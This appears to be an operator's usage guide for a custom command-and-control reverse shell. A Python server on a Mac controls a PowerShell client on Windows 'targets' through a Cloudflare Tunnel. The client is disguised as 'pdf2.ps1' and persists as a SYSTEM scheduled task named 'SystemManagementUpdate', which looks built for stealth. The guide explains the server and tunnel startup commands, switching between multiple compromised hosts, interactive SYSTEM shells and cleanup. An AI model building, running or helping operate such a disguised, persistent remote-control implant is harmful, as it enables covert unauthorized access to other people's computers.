# Shell C2 — Usage Guide

## Architecture

```
[Mac] server.py  ←—Cloudflare Tunnel—→  [Windows] pdf2.ps1
  operator types commands                 executes & streams output back
```

- `server.py` runs on your **Mac** — your operator terminal.
- `pdf2.ps1` runs on the **Windows** target, connects back via Cloudflare Tunnel, executes commands, and streams output back.

---

## Starting Up (Order Matters)

Always start in this order to avoid connection errors:

```bash
# 1. Start the Python server first
python3 server.py

# 2. Start the Cloudflare tunnel (in a separate terminal)
cloudflared tunnel --config ~/.cloudflared/config.yml run hostel-mac

# 3. Run pdf2.ps1 on the Windows target
```

> **Why order matters:** If the tunnel starts before `server.py`, cloudflared can't reach port 4444 and logs `connection refused`. The Windows client will retry with exponential backoff automatically once the server is up.

---

## Operator Commands

Type these at the prompt — they are **not** sent to the remote shell.

| Command           | What it does                                               |
| ----------------- | ---------------------------------------------------------- |
| `sessions`        | List all connected clients with status                     |
| `use <id>`        | Switch active target (by hostname or number from sessions) |
| `cancel`          | Abort the running command on the active client             |
| `Ctrl+\`          | Same as cancel (keyboard shortcut)                         |
| `status`          | Check active client connectivity                           |
| `kill <id>`       | Send exit to a specific client                             |
| `remove <id>`     | Remove a stale/dead client from the sessions list          |
| `exit`            | Shut down the server                                       |
| `help`            | Show available commands                                    |
| _(anything else)_ | Sent as a command to the active client's shell             |

---

## Multi-Client Support

When multiple Windows machines are running the client script, each identifies itself by hostname. The server tracks them independently.

**List all connected clients:**

```
shell> sessions
[*] 2 client(s):
  [1] DESKTOP-ABC           ONLINE (IDLE) — 1.2s ago
  [2] LAPTOP-XYZ            ONLINE (RUNNING) — 0.8s ago ←
```

The `←` marker shows the currently active target.

**Select a target (by number or name):**

```
shell> use 1
[*] Active target: DESKTOP-ABC

DESKTOP-ABC> whoami
```

You can also use partial hostname matching:

```
shell> use laptop
[*] Active target: LAPTOP-XYZ
```

**Switch between clients freely:**

```
DESKTOP-ABC> use 2
[*] Active target: LAPTOP-XYZ

LAPTOP-XYZ> ipconfig /all
```

**Kill a specific client:**

```
shell> kill 2
[*] Exit command sent to LAPTOP-XYZ.
```

---

## Cancelling a Running Command

**Two ways:**

**1. Keyboard shortcut — `Ctrl+\`** _(recommended)_
Press `Ctrl+\` at any time while a command is running. This sends an instant cancel signal without needing to type anything.

**2. Type `cancel`**

```
shell> cancel
```

The cancel signal is picked up by the client on its next poll (~200ms), stops the command, and replies:

```
[!] Command cancelled by operator.
```

> **Note:** `Ctrl+C` exits `server.py` entirely — use `Ctrl+\` or type `cancel` to stop just the remote command.

---

## Long-Running Commands (No Timeout)

Default timeout is **300 seconds**. For commands that legitimately run longer, prefix with `notimeout:`:

```
shell> notimeout:ping -t google.com
shell> notimeout:netstat -an
```

The header confirms the mode:

```
PS C:\> ping -t google.com [no-timeout]
```

Always use `Ctrl+\` or `cancel` to stop a no-timeout command when done.

---

## Interactive Mode (cmd, powershell, python, etc.)

Typing a bare interactive binary name (no arguments) drops you into an interactive session where your input is forwarded as stdin to that process:

```
DESKTOP-ABC> cmd
PS C:\Windows\system32> cmd [300s] [interactive]
Microsoft Windows [Version 10.0.22631.5189]
(c) Microsoft Corporation. All rights reserved.

DESKTOP-ABC [interactive]> whoami
C:\Windows\System32>whoami
nt authority\system

DESKTOP-ABC [interactive]> cancel
[*] Cancel signal queued for DESKTOP-ABC.
```

**How it works:**

- The prompt changes to `hostname [interactive]>` while the session is active.
- Everything you type is sent as stdin to the remote process (not as a new PowerShell command).
- Output streams back in real time.
- Type `cancel` or press `Ctrl+\` to kill the interactive process and return to normal mode.

**Auto-detected interactive binaries:**

`cmd`, `powershell`, `pwsh`, `python`, `python3`, `node`, `nslookup`, `ftp`, `telnet`, `wsl`, `bash`, `diskpart`

These are only routed to interactive mode when typed **without arguments**. With arguments (e.g. `python script.py`, `cmd /c dir`) they run as normal commands.

**Note:** The client runs as `NT AUTHORITY\SYSTEM` when installed via scheduled task. SYSTEM has a minimal PATH, so binaries like `python` or `node` may not be found unless installed system-wide. Use full paths if needed (e.g. `C:\Python312\python.exe`).

---

## Viewing Truncated Output (Full Result)

Output chunks are capped at **32,000 bytes**. If a command produces more, the chunk is trimmed with `[...truncated]`.

**Workaround — pipe to a file and read it in parts:**

```
# Step 1: redirect output to a file on the target
shell> some-command > C:\output.txt

# Step 2: read it in chunks
shell> Get-Content C:\output.txt -TotalCount 100    # first 100 lines
shell> Get-Content C:\output.txt -Tail 100           # last 100 lines
shell> Get-Content C:\output.txt | Select-Object -Skip 100 -First 100  # lines 101–200
```

**Or limit output at the source:**

```
shell> Get-Process | Select-Object -First 30
shell> dir C:\ | Where-Object { $_.Name -like "*.txt" }
```

---

## Checking Client Status

```
shell> status
```

Possible outputs:

| Output                                                     | Meaning                                 |
| ---------------------------------------------------------- | --------------------------------------- |
| `Client ONLINE (IDLE) — last check-in 1.2s ago`            | Connected, waiting for commands         |
| `Client ONLINE (RUNNING command) — last check-in 0.4s ago` | Currently executing                     |
| `Client may be OFFLINE — last check-in 45s ago`            | No recent ping — may have crashed       |
| `No client check-in yet.`                                  | Client has never connected this session |

The server also auto-warns if there's been no check-in for 20+ seconds.

---

## Sending Remote Commands

Just type any PowerShell command at `shell>`:

```
shell> whoami
shell> ipconfig /all
shell> Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
```

The command header shows prompt path and timeout mode:

```
PS C:\Windows\system32> whoami [300s]
PS C:\> ping -t google.com [no-timeout]
```

---

## Persistence & Crash Recovery

The client installs itself as a Windows Scheduled Task (`SystemManagementUpdate`):

- **Trigger:** At system startup
- **Auto-restart on crash:** Up to 3 restarts, 10-second delay each

Check it in Task Scheduler → `SystemManagementUpdate` → Settings tab.

---

## Log File (`shell.txt`)

Located in the same directory as `pdf2.ps1`. Auto-rotates at 5 MB (old log → `shell.txt.old`).

Common log entries:

| Entry                                    | Meaning                                             |
| ---------------------------------------- | --------------------------------------------------- |
| `Client started. PID=...`                | Client launched                                     |
| `CMD: <command>`                         | Command received from server                        |
| `Created new persistent runspace`        | First command of session (normal)                   |
| `Connection error #N: (530)`             | Cloudflare tunnel not ready yet — client will retry |
| `Connection error #N: (502) Bad Gateway` | Server unreachable — check `server.py` is running   |
| `Command timed out`                      | Command hit 300s limit — use `notimeout:` if needed |
| `Command cancelled`                      | Operator triggered cancel                           |

---

## Troubleshooting

### "connection refused" in cloudflared logs

`server.py` wasn't running when the tunnel started. Start `server.py` first.

### 530 errors in shell.txt

Cloudflare tunnel wasn't established yet when the client started. The client retries automatically with exponential backoff — no action needed if the tunnel comes up within a minute.

### 400 Bad Request / "Unsolicited response on idle HTTP channel"

This was a known bug — fixed. The server now sends `Connection: close` on every response, preventing cloudflared from trying to reuse connections with HTTP/2 frames on an HTTP/1.1 socket.

### Output streaming feels slow

Output streams adaptively: ~200ms when output is flowing, up to 1s when idle. If everything looks slow, check `status` — the client may be offline.

---

## Output Streaming Behaviour

| Condition                  | Flush interval |
| -------------------------- | -------------- |
| Output actively flowing    | ~200 ms        |
| No output for a few cycles | ~500 ms        |
| Idle (no output)           | ~1000 ms       |

---

## Finding Running Processes & Full Cleanup

### Mac — server.py

**Find the process:**

```bash
pgrep -a python3 | grep server.py
# or
ps aux | grep server.py
```

**Kill it:**

```bash
pkill -f server.py
# or use the PID from above:
kill <PID>
```

**Stop the Cloudflare tunnel:**

```bash
pkill cloudflared
```

---

### Windows — pdf2.ps1 (target machine)

**Send a clean shutdown from the server** _(preferred)_:

```
shell> exit
```

This tells the client to break its loop and exit gracefully.

**Find the process manually (run on Windows):**

```powershell
Get-Process powershell | Where-Object { $_.MainWindowTitle -eq "" }
# or find by PID from shell.txt:
Get-Process -Id <PID>
```

**Kill it manually (run on Windows):**

```powershell
Stop-Process -Id <PID> -Force
# or kill all hidden PowerShell instances:
Get-Process powershell | Where-Object { $_.MainWindowTitle -eq "" } | Stop-Process -Force
```

---

### Full Cleanup on Windows (remove persistence + logs)

Run these on the Windows target to completely remove the client:

```powershell
# 1. Kill the running process
$logPath = "C:\path\to\shell.txt"   # adjust to actual path
$content = Get-Content $logPath | Where-Object { $_ -match "PID=(\d+)" }
# or just:
Get-Process powershell | Where-Object { $_.MainWindowTitle -eq "" } | Stop-Process -Force

# 2. Remove the scheduled task
Unregister-ScheduledTask -TaskName "SystemManagementUpdate" -Confirm:$false

# 3. Delete log files
Remove-Item "C:\path\to\shell.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\path\to\shell.txt.old" -Force -ErrorAction SilentlyContinue

# 4. Delete the script itself
Remove-Item "C:\path\to\pdf2.ps1" -Force
```

**Verify the task is gone:**

```powershell
Get-ScheduledTask -TaskName "SystemManagementUpdate" -ErrorAction SilentlyContinue
# Should return nothing if successfully removed
```

---

## Quick Reference

| Action                 | How                                   |
| ---------------------- | ------------------------------------- |
| List clients           | `sessions`                            |
| Select a target        | `use <id or number>`                  |
| Cancel running command | `Ctrl+\` or type `cancel`             |
| Kill the server        | `Ctrl+C`                              |
| Run with no timeout    | `notimeout:<command>`                 |
| Interactive shell      | `cmd`, `powershell`, `python` (bare)  |
| Check connectivity     | `status`                              |
| Shut down a client     | `kill <id or number>`                 |
| Remove stale client    | `remove <id or number>`               |
| Shut down the server   | `exit`                                |
| View help              | `help`                                |
| Read long output       | Pipe to file, read with `Get-Content` |
